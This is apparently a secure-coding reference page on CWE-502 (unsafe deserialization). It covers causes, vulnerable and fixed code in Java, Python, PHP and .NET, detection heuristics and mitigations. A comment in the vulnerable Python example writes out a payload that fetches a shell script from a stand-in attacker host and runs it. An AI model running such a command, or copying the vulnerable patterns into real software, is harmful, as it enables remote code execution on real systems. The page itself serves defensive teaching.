---
description: "CWE-502: Deserializing attacker-controlled data enables arbitrary code execution via gadget chains. Root cause: object instantiation during deserialization invokes constructors and method chains."
date: 2026-04-16
tags: [security, cwe, deserialization, rce, java, python, php, dotnet, ruby, nodejs]
level: Advanced
---

# CWE-502: Deserialization of Untrusted Data

**CWE-502** | OWASP Top 10 A08:2021 | CVSS Base Score range: 8.1-9.8 | Rank 16 in CWE Top 25

## Functional Semantics

Deserialization reconstructs an object graph from a byte stream. The vulnerability arises because the deserializer must instantiate objects and invoke methods (readObject, __wakeup, __destruct, property setters) **before** application code can inspect the result. Attacker-supplied data controls which classes are instantiated and with what state, enabling traversal of pre-existing "gadget chains" — sequences of legitimate class methods that, when chained, produce arbitrary OS command execution.

The attacker does not inject new code; they compose existing code in unexpected ways. The exploit requires only that a gadget chain exist among the loaded classes (JVM classpath, Python import tree, etc.), not in the application's own code.

## Root Cause

Deserialization formats that encode type information alongside data allow the deserializer to instantiate arbitrary classes from the runtime's class universe. The security boundary assumed by the application (only expected data types arrive) is absent at the protocol level. Fixes at the data-validation layer are uniformly too late — object construction already occurred.

## Trigger Conditions

- Deserializer receives data from: HTTP body/cookie, WebSocket frame, message queue, RPC parameter, file upload, database BLOB read from user-writable table, cache layer (Redis/Memcached) populated from user input.
- Serialization format carries type metadata: Java native serialization (`AC ED 00 05`), Python pickle (`\x80\x04` opcodes), PHP `O:` / `a:` strings, .NET BinaryFormatter, Ruby Marshal (`\x04\x08`), YAML with `!!` tags, AMF, Kryo with default registration.
- Gadget chain libraries present in classpath: `commons-collections`, `spring-core`, `groovy`, `xstream`, `ysoserial`-covered libraries.

## Affected Ecosystems

| Platform | Vulnerable API | Safe Alternative |
|---|---|---|
| Java | `ObjectInputStream.readObject()` | JSON (Jackson with type restrictions), `readResolve` allowlisting |
| Python | `pickle.loads()`, `yaml.load()`, `shelve` | `json`, `yaml.safe_load()`, `ast.literal_eval()` |
| PHP | `unserialize()` | `json_decode()`, set `allowed_classes` parameter |
| .NET | `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter` | `System.Text.Json`, `DataContractSerializer` with `DataContractResolver` |
| Ruby | `Marshal.load()` | JSON, MessagePack |
| Node.js | `node-serialize` (npm), `serialize-javascript` eval path | Plain JSON |
| XML/YAML | `XStream.fromXML()`, `yaml.load()` with `!!python/object` | Schema-validated parsers, safe loaders |

## Vulnerable Patterns

### Java — ObjectInputStream without allowlist

```java
// VULNERABLE: deserializes arbitrary classes from HTTP body
@PostMapping("/api/prefs")
public ResponseEntity<?> loadPrefs(@RequestBody byte[] data) {
    try (ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(data))) {
        UserPrefs prefs = (UserPrefs) ois.readObject(); // gadget chain executes here
        return ResponseEntity.ok(prefs);
    }
}
```

### Python — pickle on untrusted input

```python
# VULNERABLE: pickle.loads executes arbitrary opcodes
import pickle, base64
from flask import request

@app.route("/restore")
def restore_session():
    data = base64.b64decode(request.cookies.get("session"))
    obj = pickle.loads(data)  # attacker payload: os.system("curl attacker.com/shell.sh|sh")
    return str(obj)
```

### PHP — unserialize without class restriction

```php
// VULNERABLE: triggers __wakeup/__destruct on arbitrary classes
$data = base64_decode($_COOKIE['cart']);
$cart = unserialize($data); // POP chain via Symfony/Laravel gadgets
```

## Fixed Patterns

### Java — ObjectInputStream with class allowlist

```java
// FIXED: allowlist via serialization filter (Java 9+)
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
ois.setObjectInputFilter(info -> {
    Class<?> cls = info.serialClass();
    if (cls == null) return ObjectInputFilter.Status.ALLOWED;
    if (cls == UserPrefs.class || cls == String.class) {
        return ObjectInputFilter.Status.ALLOWED;
    }
    return ObjectInputFilter.Status.REJECTED; // block gadget chains
});
UserPrefs prefs = (UserPrefs) ois.readObject();
```

### Python — eliminate pickle, use JSON

```python
# FIXED: JSON cannot instantiate arbitrary objects
import json, base64
from flask import request

@app.route("/restore")
def restore_session():
    raw = base64.b64decode(request.cookies.get("session"))
    data = json.loads(raw)  # pure data, no code execution
    prefs = UserPrefs(theme=data["theme"], lang=data["lang"])
    return str(prefs)
```

### PHP — allowed_classes restriction

```php
// FIXED: restricts instantiation to known safe classes
$data = base64_decode($_COOKIE['cart']);
$cart = unserialize($data, ["allowed_classes" => ["CartItem", "ProductRef"]]);
// Returns false if unknown class encountered
if ($cart === false) { /* reject */ }
```

### .NET — replace BinaryFormatter

```csharp
// VULNERABLE
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(stream); // CS0618 warning in .NET 5+, removed .NET 9

// FIXED: System.Text.Json with strict type handling
var options = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };
var obj = JsonSerializer.Deserialize<UserPrefs>(stream, options);
```

## Detection Heuristics

**Static analysis triggers:**
- `ObjectInputStream`, `readObject`, `readUnshared` on non-constant `InputStream`
- `pickle.loads`, `pickle.load` where argument is not a file opened by the application
- `yaml.load(` without `Loader=yaml.SafeLoader` argument
- `unserialize(` in PHP without `allowed_classes`
- `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer` usage (all deprecated)
- `Marshal.load` in Ruby on any non-hardcoded input
- `eval(` in node-serialize deserialization path

**Data-flow triggers:**
- Serialized data originates from: `request.body`, `request.cookies`, `request.headers`, query parameter, file upload, message queue read
- Magic bytes in controlled data: `AC ED 00 05` (Java), `\x80\x04` or `\x80\x05` (Python pickle v4/v5), `O:` prefix (PHP), `\x04\x08` (Ruby Marshal)

**Dependency triggers (gadget chain presence):**
- Maven/Gradle: `commons-collections < 3.2.2`, `commons-beanutils < 1.9.4`, `spring-core`, `groovy-all`
- npm: `node-serialize` (any version — fundamentally unsafe)
- pip: `PyYAML < 6.0` with `yaml.load` without Loader

**False positive indicators:**
- `ObjectInputStream` reading from a file that the application itself wrote in the same request lifecycle (no user control over content).
- `pickle.loads` in unit test fixtures loading known-good test data from source-controlled files.
- Serialized data protected by HMAC verified **before** deserialization — reduces but does not eliminate risk if HMAC secret leaks.

## Gotchas

- **HMAC-signed serialized data is not safe.** If the signing key is compromised (environment variable, hardcoded, timing side-channel), the attacker can forge valid signatures. Never serialize to formats with type metadata, regardless of signing.
- **JSON is not universally safe.** `json.loads` in Python is safe; `JSON.parse` in Node.js is safe. But `JSON.parse` followed by `eval(result.code)` or `new Function(result.fn)` reintroduces code execution. The vulnerability is in post-deserialization use, not the JSON parser itself.
- **allowlist bypass via inheritance.** A Java ObjectInputFilter allowlisting `Collection` accepts `ArrayList`, `HashMap`, and any third-party class implementing `Collection`. Use final class checks, not `isAssignableFrom`.
- **Gadget chains survive class updates.** Patching `commons-collections` removes known gadgets but new chains are regularly discovered. Allowlisting is a stronger control than dependency updates alone.
- **.NET DataContractSerializer is conditionally safe.** With `DataContractResolver` it can instantiate arbitrary types if the resolver is permissive. Default behavior (no resolver, explicit known types only) is safe.
- **Redis/Memcached as deserialization vector.** Applications reading Java-serialized objects from Redis are vulnerable if an attacker can write to the cache key (via SSRF to Redis, or cache poisoning via unvalidated keys).

## Exploitation Impact

- **Direct RCE:** gadget chain terminates in `Runtime.exec()`, `ProcessBuilder`, `os.system()`, `eval()`
- **File write:** gadget chain writes to filesystem, enabling webshell creation
- **SSRF pivot:** gadget chain initiates outbound HTTP requests to internal services
- **Privilege escalation:** deserialization in context of privileged service (e.g., Jenkins master, application server admin)

## Mitigation Priority

1. **Eliminate the format** — replace binary/type-aware serialization with JSON/protobuf (no type metadata). Highest ROI.
2. **Allowlist classes** — Java serialization filter, PHP `allowed_classes`. Necessary when format cannot be changed.
3. **Integrity check before deserialization** — HMAC the payload, verify before passing to deserializer.
4. **Network isolation** — if gadget chains require outbound network (DNS callback, reverse shell), block egress from deserializer process.
5. **Java agent deserialization blockers** — `SerialKiller`, `NotSoSerial`, `HardenedObjectInputStream` as defense-in-depth.

## See Also

- CWE-020: Input Validation — upstream control: validate format before deserialization
- CWE-094: Code Injection — overlapping impact: arbitrary code execution
- [[cwe-918-ssrf]] — gadget chain often used to trigger internal HTTP requests
- CWE-611: XML External Entities — similar pattern: parser instantiates external resources
